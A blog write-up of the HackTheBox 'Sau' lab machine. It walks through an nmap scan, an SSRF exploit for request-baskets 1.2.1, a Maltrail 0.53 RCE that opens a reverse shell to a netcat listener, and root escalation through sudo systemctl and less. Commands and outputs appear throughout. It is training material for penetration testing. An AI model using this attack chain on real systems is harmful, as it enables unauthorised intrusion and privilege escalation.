+++
title = 'HackTheBox - Sau box write-up'
date = 2024-12-25T22:51:45+01:00
slug = "hackthebox-sau-writeup"
+++

![Sau Machine Image](/sau.png)

## Intro
---

It's far too early in my journey, I suppose; there’s a lot to learn before that, since I don't know many of these things. But I've been looking into what’s needed to prepare for the OSCP eventually and if there are any labs that provide decent experience resembling the OSCP exam. I came across a repo by [Rana Khalil](https://www.linkedin.com/in/ranakhalil1/), which led me to a great [spreadsheet of labs](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#) by TJ_Null. These labs are supposedly a good way to start building practical skills for OSCP (be sure to check the PWK V3 tab). This's one of many — let's work through this box together.


## Nmap
---

Scanning the target machine reveals a few open ports:

- 22/tcp - OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
- 80/tcp    filtered http
- 55555/tcp open     unknown

```
┌──(ognard㉿ognard)-[~]
└─$ nmap -sC -sV sau.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-25 20:24 CET
Nmap scan report for sau.htb (10.10.11.224)
Host is up (0.044s latency).
Not shown: 997 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
55555/tcp open     unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Wed, 25 Dec 2024 19:25:20 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Wed, 25 Dec 2024 19:24:54 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Wed, 25 Dec 2024 19:24:54 GMT
|_    Content-Length: 0

...

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.50 seconds
```

## Request-baskets CVE
---

As we can see from our Nmap scan, port 80 is filtered, meaning we can't access `http://sau.htb` in the browser.

However, if we access `http://sau.htb` on port 55555 in the browser, we find an application running, powered by `request-baskets` version 1.2.1.

To gain access to the filtered service on port 80, we’ll use an SSRF exploit for `request-baskets` version 1.2.1 ([CVE-2023-27163](https://github.com/entr0pie/CVE-2023-27163/blob/main/CVE-2023-27163.sh)):

```
┌──(ognard㉿ognard)-[~]
└─$ ./request-baskets.sh http://sau.htb:55555 http://sau.htb:80
Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163

> Creating the "vgagsl" proxy basket...
> Basket created!
> Accessing http://sau.htb:55555/vgagsl now makes the server request to http://sau.htb:80.
> Authorization: 7bxwJB7IJlxTDrCFkMpuTie-Td_n-jZKgGsoRHmeh9QG
```

This exploit allows us to access other services running on the target machine that only accept connections from localhost. It works by creating a malicious basket on the target's `request-basket` server. We’ll provide the `request-basket` server running on port 55555 as the first argument and specify the target service we want to access — in this case, the site running on the filtered port 80.


## Maltrail
---

Now that we have access to the site through the newly created basket from the previous exploit, we can see that the site is powered by the Maltrail (v0.53) service. A quick search reveals an existing [RCE exploit](https://github.com/spookier/Maltrail-v0.53-Exploit) for this service, which we can utilize:

```
┌──(ognard㉿ognard)-[~]
└─$ python3 maltrail-0.53.py 10.10.14.24 4444 http://sau.htb:55555/vgagsl
Running exploit on http://sau.htb:55555/vgagsl/login
```

>  Keep in mind that you’ll need to have a running listener in another terminal on your local machine to establish a connection with the target machine.

And we're in:

```
┌──(ognard㉿ognard)-[~]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.24] from (UNKNOWN) [10.10.11.224] 40704
$ whoami
puma
$ 
```

### Stabilize the Shell
---

To stabilize the shell, we’ll do the following:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Next, we'll press Ctrl+Z and run this:

```
stty raw -echo;fg
export TERM=xterm
```

## Privilege Escalation
---

We can already **read the user flag in the user's home directory**. Next, we need to escalate our privileges to root. We can use `sudo -l` to check if there’s anything that `puma` can run with root privileges:

```
puma@sau:/opt/maltrail$ sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

While there are instructions for abusing `systemctl` on [gtfobins](https://gtfobins.github.io/gtfobins/systemctl/), we can't do much with that in our case. However, what we can do for now is check the version of `systemctl` on this machine:

```
puma@sau:~$ /usr/bin/systemctl --version
systemd 245 (245.4-4ubuntu3.22)
+PAM +AUDIT +SELINUX +IMA +APPARMOR +SMACK +SYSVINIT +UTMP +LIBCRYPTSETUP +GCRYPT +GNUTLS +ACL +XZ +LZ4 +SECCOMP +BLKID +ELFUTILS +KMOD +IDN2 -IDN +PCRE2 default-hierarchy=hybrid
```

Maybe we can find a vulnerability for this version? After some searching, we come across CVE-2023–26604. When we run `sudo /usr/bin/systemctl status trail.service`, the status output is displayed in `less`. Since we’re running this command with root privileges, we’ve essentially opened `less` with root privileges as well. And since `less` can execute commands, we can use the `!sh` command to gain access to the root shell.

```
puma@sau:~$ sudo /usr/bin/systemctl status trail.service
● trail.service - Maltrail. Server of malicious traffic detection system
     Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor preset:>
     Active: active (running) since Wed 2024-12-25 15:58:03 UTC; 4h 56min ago
       Docs: https://github.com/stamparm/maltrail#readme
             https://github.com/stamparm/maltrail/wiki
   Main PID: 896 (python3)
      Tasks: 49 (limit: 4662)
     Memory: 339.0M
     CGroup: /system.slice/trail.service
             ├─  896 /usr/bin/python3 server.py
             ├─ 1150 /bin/sh -c logger -p auth.info -t "maltrail[896]" "Failed >
             ├─ 1151 /bin/sh -c logger -p auth.info -t "maltrail[896]" "Failed >
             ├─ 1154 sh
             ├─ 1155 python3 -c import socket,os,pty;s=socket.socket(socket.AF_>
             ├─ 1156 /bin/sh
             ├─ 1160 python3 -c import pty;pty.spawn("/bin/bash")
             ├─ 1161 /bin/bash
             ├─ 1175 /bin/sh -c logger -p auth.info -t "maltrail[896]" "Failed >
             ├─ 1176 /bin/sh -c logger -p auth.info -t "maltrail[896]" "Failed >
             ├─ 1179 sh
             ├─ 1180 python3 -c import socket,os,pty;s=socket.socket(socket.AF_>
             ├─ 1181 /bin/sh
             ├─ 1182 python3 -c import pty;pty.spawn("/bin/bash")
!sh
# id
uid=0(root) gid=0(root) groups=0(root)
```

**Now we can read the root flag in /root/ directory.**

And... that's all! **Sau is down** — we’ve owned this easy and fun box!